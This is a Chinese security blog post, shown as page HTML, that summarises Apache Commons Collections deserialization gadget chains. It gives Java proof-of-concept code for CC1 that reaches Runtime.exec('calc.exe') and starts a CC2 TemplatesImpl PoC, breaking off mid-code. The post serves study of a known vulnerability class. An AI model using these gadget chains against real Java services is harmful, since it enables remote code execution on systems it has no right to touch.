<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CC利用链总结 | zyyyc</title><meta name="author" content="zhangyuechuan"><meta name="copyright" content="zhangyuechuan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CC1:这里我们直接总结之前自己所理解的一些重点: 123456789101112131415161718192021222324252627282930313233package Ez_Java;import org.apache.commons.collections.map.TransformedMap;import org.apache.commons.collections.Transf">
<meta property="og:type" content="article">
<meta property="og:title" content="CC利用链总结">
<meta property="og:url" content="https://zyyc0.github.io/2025/04/09/CC%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="zyyyc">
<meta property="og:description" content="CC1:这里我们直接总结之前自己所理解的一些重点: 123456789101112131415161718192021222324252627282930313233package Ez_Java;import org.apache.commons.collections.map.TransformedMap;import org.apache.commons.collections.Transf">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zyyc0.github.io/img/123.png">
<meta property="article:published_time" content="2025-04-09T13:55:48.000Z">
<meta property="article:modified_time" content="2025-04-09T13:57:48.215Z">
<meta property="article:author" content="zhangyuechuan">
<meta property="article:tag" content="Java,Cyber Security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zyyc0.github.io/img/123.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CC利用链总结",
  "url": "https://zyyc0.github.io/2025/04/09/CC%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93/",
  "image": "https://zyyc0.github.io/img/123.png",
  "datePublished": "2025-04-09T13:55:48.000Z",
  "dateModified": "2025-04-09T13:57:48.215Z",
  "author": [
    {
      "@type": "Person",
      "name": "zhangyuechuan",
      "url": "https://zyyc0.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zyyc0.github.io/2025/04/09/CC%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":100,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CC利用链总结',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-color: #b26770;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/123.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/write/"><i class="fa-fw fa-solid fa-feather-pointed"></i><span> 闲言</span></a></div><div class="menus_item"><a class="site-page" href="/talk2me/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://haowallpaper.com/link/common/file/previewFileImg/15691089397322048);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">zyyyc</span></a><a class="nav-page-title" href="/"><span class="site-name">CC利用链总结</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/write/"><i class="fa-fw fa-solid fa-feather-pointed"></i><span> 闲言</span></a></div><div class="menus_item"><a class="site-page" href="/talk2me/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CC利用链总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-09T13:55:48.000Z" title="发表于 2025-04-09 21:55:48">2025-04-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-09T13:57:48.215Z" title="更新于 2025-04-09 21:57:48">2025-04-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1:"></a>CC1:</h2><p>这里我们直接总结之前自己所理解的一些重点:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Ez_Java;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class run=Runtime.class;<br>        Class run2=Runtime.class.getClass();<br>            <span class="hljs-comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br>            Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>            &#125;;<br>            <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>            <span class="hljs-comment">//创建Map并绑定transformerChina</span><br>            <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br><br>            <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>, transformerChain);<br>            outerMap.put(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里先用一句话总结这里的调用流程:<br>RunTime这个类没有继承serliazeable接口,所以转换为RunTime.class </p>
<p>之后传入进去后获取一次getClass()后变成一般的,Class,先去获取到这个class的getMethod方法,参数为getRuntime,执行后获得一个getRuntime的Method对象,再带入进去,获取一次getClass()后变成普通Class,去获取它的invoke方法,之后执行这个getRuntime的Method对象的invoke方法,没有参数,获取到了一个Runtime类对象了,之后便是常规的去获取这个类的exec方法,并带上命令去执行的操作了</p>
<p>上面使用的是TransformedMap,在cc1中还有一个类就是我们的LazyMap</p>
<p><strong>在两个类不同点在于<code>TransformedMap</code>是在<code>put</code>方法去触发<code>transform</code>方法，而<code>LazyMap</code>是在<code>get</code>方法去调用方法。</strong><br> 而我们如果想要通过这个序列化流去触发反序列化命令执行的话,那么我们就需要使用到我们的LazyMap</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220710175837904.png" alt="image-20220710175837904"></p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220710175900824.png" alt="image-20220710175900824"></p>
<p>  当调用get(key)的key不存在时，会调用transformerChain的transform()方法。</p>
<p>那么去修改一下poc来看看能不能尝试成功:<br><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220710180100937.png" alt="image-20220710180100937"></p>
<p>这里我们看到这个AnnotationInvocationHandler类</p>
<p>那么这里我们找到的这个AnnotationInvocationHandler类是用来处理注解的,我们去到这类里面去看看:</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220710181036279.png" alt="image-20220710181036279"></p>
<p>在它的构造函数里面会对两个属性进行赋值,一个是type一个是Value,这个类同时也重写了我们的readbject函数</p>
<p>那么我们再去看看它的readObject函数:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">GetField</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> var1.readFields();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> (Class)var2.get(<span class="hljs-string">&quot;type&quot;</span>, (Object)<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> (Map)var2.get(<span class="hljs-string">&quot;memberValues&quot;</span>, (Object)<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        var5 = AnnotationType.getInstance(var3);<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var13) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var5.memberTypes();<br>    <span class="hljs-type">LinkedHashMap</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>();<br><br>    String var10;<br>    Object var11;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">Iterator</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;<br>        <span class="hljs-type">Entry</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> (Entry)var8.next();<br>        var10 = (String)var9.getKey();<br>        var11 = <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> (Class)var6.get(var10);<br>        <span class="hljs-keyword">if</span> (var12 != <span class="hljs-literal">null</span>) &#123;<br>            var11 = var9.getValue();<br>            <span class="hljs-keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                var11 = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(var11.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var11 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var5.members().get(var10));<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="hljs-built_in">this</span>, var3);<br>    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="hljs-built_in">this</span>, var7);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>his.type</code>的注解要存在注解元素名（为了满足var3不为空），<code>this.memberValues</code>中存在的一个键值对的键名与<code>this.type</code>的注解要存在注解元素名相等。（为了满足var7!&#x3D;null）同时这个键值对的键名不可改变，但是值可以改变。</p>
<p>这里直接给出这一步的poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <br>            Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                            String.class,<br>                            Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                            Object.class,<br>                            Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span><br>                            <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class<br>                    &#125;,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<br>                                    <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;),<br>            &#125;;<br>            <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>                    <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>            <span class="hljs-comment">//Map outerMap = TransformedMap.decorate(innerMap, null,transformerChain);</span><br>     <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap,transformerChain);<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span><br>                    Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class,<br>                    Map.class);<br>            construct.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler)<br>                    construct.newInstance(Retention.class, outerMap);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>            oos.writeObject(handler);<br>            oos.close();<br>            System.out.println(barr);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span><br>                    <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里是通过去寻找某一个readObject的函数,在这个函数中去调用到LazyMap的get函数接口</p>
<p>那么这里我们嵌套了两层代理</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220717191826923.png" alt="image-20220717191826923"></p>
<p>目的就是通过第一次先去触发这个最外层的这个AnnotationInvocationHandler类的readObject方法中</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220717192327681.png" alt="image-20220717192327681"></p>
<p>通过调用我们的这个next的函数的时候会成功触发到去调用到我们的第二个内部的这个的 AnnotationInvocationHandler类的这个invoke方法</p>
<p>而在这里的这个invoke方法中:<br><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220717192452280.png" alt="image-20220717192452280"></p>
<p><strong>又会调用到memberValues的get方法,而此时我们的这个memberValues就是我们的这个LazyMap这个对象了</strong></p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220717192621306.png" alt="image-20220717192621306"></p>
<p>但是这里我们的poc中出现了一点小问题,那就是没有进入到第一个if里面去,所以我们的这个cc1这条链子对jdk的版本限制要求其实是有点大的</p>
<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链:"></a>利用链:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">AnnotationInvocationHandler.readObject()<br>	proxyMap.next()<br>		AnnotationInvocationHandler.invoke()<br>			LazyMap.get()<br>				transformerChain.transform()<br>					ConstantTransformer.transform()<br>						.........<br>							exec<br></code></pre></td></tr></table></figure>

<p>总的来说CC1就两个重要点:</p>
<p>​	动态代理</p>
<p>​	LazyMap.get方法触发到我们的invokerTransform的链子执行</p>
<h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2:"></a>CC2:</h2><p>CC2链是基于 Apache common collection 4.0的因为利用链中的一个类（TransformingComparator）在3.0是没有实现Serializable接口，而且</p>
<p><strong>在jdk8u71的时候AnotationInvocationHandler的readObject已经被改写，CC1链在apache common collection 4.0的时候失效</strong></p>
<p><strong>CC2与CC1不同在于CC2用的是Commons Collections4.0</strong>;</p>
<p><strong>同时利用方式CC2用到了Javassist动态编程，从功能上来说CC1用于执行命令，而CC2可以任意代码执行危害更大，所以像常用的shiro打内存马也会用到CC2。</strong></p>
<p>在CC2中其实就是通过Templ去加载这个任意字节码从而造成的这个代码执行而已,而为什么需要谈及到这个</p>
<p>Javassist技术,是因为对于Templ加载的类的字节码是有要求的,加载的这个类必须要是继承了这个AbstractTranslet类才可以.</p>
<p>这里我们先直接给出我们的这个poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String AbstractTranslet=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>        String TemplatesImpl=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br><br>        ClassPool classPool=ClassPool.getDefault();     <span class="hljs-comment">//获取默认类池</span><br>        classPool.appendClassPath(AbstractTranslet);    <span class="hljs-comment">//末尾添加一个ClassPath</span><br>        CtClass payload=classPool.makeClass(<span class="hljs-string">&quot;j&quot;</span>);   <span class="hljs-comment">//新创建一个类，类名为j</span><br>        